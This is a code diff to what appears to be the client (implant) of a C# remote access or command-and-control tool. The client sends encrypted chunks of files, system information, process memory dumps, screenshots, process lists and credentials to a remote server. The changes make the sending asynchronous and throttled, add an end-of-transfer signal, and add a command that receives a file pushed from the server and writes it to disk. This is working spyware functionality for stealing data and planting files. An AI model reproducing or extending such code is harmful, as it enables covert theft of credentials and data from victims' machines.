@@ -13,6 +13,7 @@ using System.ServiceModel.Channels;
 using System.Management;
 using Microsoft.Win32;
 using System.Net;
+using System.Collections.Concurrent;
 
 namespace Client_side
 {
@@ -46,7 +47,7 @@ namespace Client_side
                         byte[] encryptedHeader = encryptor.Encrypt(fileHeader);
                         NetworkLayer.SendResult(encryptedHeader);
 
-                        SendChunks(fileChunks, encryptor, fileID);
+                        _ = SendChunks(fileChunks, encryptor, fileID);
                         break;
                     }
                 case "3":
@@ -60,7 +61,7 @@ namespace Client_side
                         byte[] encryptedHeader = encryptor.Encrypt(fileHeader);
                         NetworkLayer.SendResult(encryptedHeader);
 
-                        SendChunks(systemInfoChunks, encryptor, fileID);
+                        _ = SendChunks(systemInfoChunks, encryptor, fileID);
                         break;
                     }
                 case "4":
@@ -68,13 +69,13 @@ namespace Client_side
                         List<string> dumpChunks = GetProcDump(commandParts[1]);
                         string fileID = Guid.NewGuid().ToString();
                         string fileLength = dumpChunks.Count.ToString();
-                        string fileName = $"dump{commandParts[1]}.dmp";
+                        string fileName = $"dump{commandParts[1]}.dmp.gz";
 
                         string fileHeader = $"{fileID}{delimiter}{fileLength}{delimiter}{fileName}";
                         byte[] encryptedHeader = encryptor.Encrypt(fileHeader);
                         NetworkLayer.SendResult(encryptedHeader);
 
-                        SendChunks(dumpChunks, encryptor, fileID);
+                        _ = SendChunks(dumpChunks, encryptor, fileID);
                         break;
                     }
                 case "5":
@@ -88,7 +89,7 @@ namespace Client_side
                         byte[] encryptedHeader = encryptor.Encrypt(fileHeader);
                         NetworkLayer.SendResult(encryptedHeader);
 
-                        SendChunks(screenShotChunks, encryptor, fileID);
+                        _ = SendChunks(screenShotChunks, encryptor, fileID);
                         break;
                     }
                 case "6":
@@ -102,7 +103,7 @@ namespace Client_side
                         byte[] encryptedHeader = encryptor.Encrypt(fileHeader);
                         NetworkLayer.SendResult(encryptedHeader);
 
-                        SendChunks(procListChunks, encryptor, fileID);
+                        _ = SendChunks(procListChunks, encryptor, fileID);
                         break;
                     }
                 case "7":
@@ -116,10 +117,23 @@ namespace Client_side
                         byte[] encryptedHeader = encryptor.Encrypt(fileHeader);
                         NetworkLayer.SendResult(encryptedHeader);
 
-                        SendChunks(credentialsChunks, encryptor, fileID);
+                        _ = SendChunks(credentialsChunks, encryptor, fileID);
                         break;
                     }
                 case "8":
+                    {
+                        bool result = ReceiveFile(encryptor);
+                        if (result)
+                        {
+                            NetworkLayer.SendResult(encryptor.Encrypt("File Received Successfully!"));
+                        }
+                        else
+                        {
+                            NetworkLayer.SendResult(encryptor.Encrypt("File Transfer Failed!"));
+                        }
+                        break;
+                    }
+                case "9":
                     {
                         NetworkLayer.SendResult(encryptor.Encrypt("Client - Logout"));
                         Environment.Exit(0);
@@ -127,6 +141,7 @@ namespace Client_side
                     }
                 default:
                     {
+                        NetworkLayer.SendResult(encryptor.Encrypt("Invalid Command!"));
                         break;
                     }
             }
@@ -461,26 +476,89 @@ namespace Client_side
             return chunks;
         }
 
-        private static void SendChunks(List<string> chunks, Encryptor encryptor, string fileID)
+        private static async Task SendChunks(List<string> chunks, Encryptor encryptor, string fileID)
         {
             int counter = 0;
-            List<Task> tasks = new List<Task>();
+            List<Task> tasks = new();
+            SemaphoreSlim semaphore = new SemaphoreSlim(50);
+            object lockObject = new object();
 
             foreach (string chunk in chunks)
             {
-                int currentCounter = counter;
-                tasks.Add(Task.Run(() =>
-                {
-                    string formattedChunk = $"{fileID}{delimiter}{chunk}{delimiter}{currentCounter}";
-                    Console.WriteLine(formattedChunk);
-                    byte[] encryptedChunk = encryptor.Encrypt(formattedChunk);
-                    NetworkLayer.SendResult(encryptedChunk);
-                }));
-
-                counter++;
+                await semaphore.WaitAsync();
+                int currentCounter = counter++;
+                tasks.Add(SendChunkAsync(chunk, encryptor, fileID, currentCounter, semaphore, lockObject));
+                Thread.Sleep(30);
             }
 
-            Task.WaitAll(tasks.ToArray());
+            await Task.WhenAll(tasks);
+
+            // Send END signal
+            string endSignal = $"{fileID}{delimiter}<END - EOF>{delimiter}{counter}{delimiter}";
+            byte[] encryptedEndSignal = encryptor.Encrypt(endSignal);
+            NetworkLayer.SendResult(encryptedEndSignal);
+        }
+
+        private static async Task SendChunkAsync(string chunk, Encryptor encryptor, string fileID, int counter, SemaphoreSlim semaphore, object lockObject)
+        {
+            
+            try
+            {
+                string formattedChunk = $"{fileID}{delimiter}{chunk}{delimiter}{counter}{delimiter}";
+                byte[] encryptedChunk = encryptor.Encrypt(formattedChunk);
+                int chunkSize = encryptedChunk.Length;
+
+                lock (lockObject)
+                {
+                    NetworkLayer.SendResult(encryptedChunk, chunkSize);
+                }
+
+                await Task.Delay(50);
+            }
+            finally
+            {
+                semaphore.Release();
+            }
+        }
+
+
+        private static bool ReceiveFile(Encryptor encryptor)
+        {
+            string delimiter = "|;|";
+            byte[] received = NetworkLayer.ReceiveCommand();
+            string decrypted = encryptor.Decrypt(received);
+            string[] parts = decrypted.Split(delimiter);
+
+            string guid = parts[0];
+            int chunkCount = int.Parse(parts[1]);
+            string fileName = parts[2];
+
+            ConcurrentDictionary<int, string> chunks = new ConcurrentDictionary<int, string>();
+
+            while (chunks.Count < chunkCount)
+            {
+                byte[] chunk = NetworkLayer.ReceiveCommand();
+                string chunkDecrypted = encryptor.Decrypt(chunk);
+                string[] chunkParts = chunkDecrypted.Split(delimiter);
+                string chunkGuid = chunkParts[0];
+                int chunkIndex = int.Parse(chunkParts[2]);
+
+                if (chunkGuid != guid)
+                {
+                    return false;
+                }
+
+                chunks[chunkIndex] = chunkParts[1];
+            }
+
+            string fileBase64 = string.Join("", chunks.OrderBy(kv => kv.Key).Select(kv => kv.Value));
+            byte[] fileData = Encryptor.InvertStr(fileBase64);
+
+            fileName = Path.GetFileName(fileName);
+            string filePath = Path.Combine(Environment.CurrentDirectory, fileName);
+            File.WriteAllBytes(filePath, fileData);
+
+            return true;
         }
     }
 }
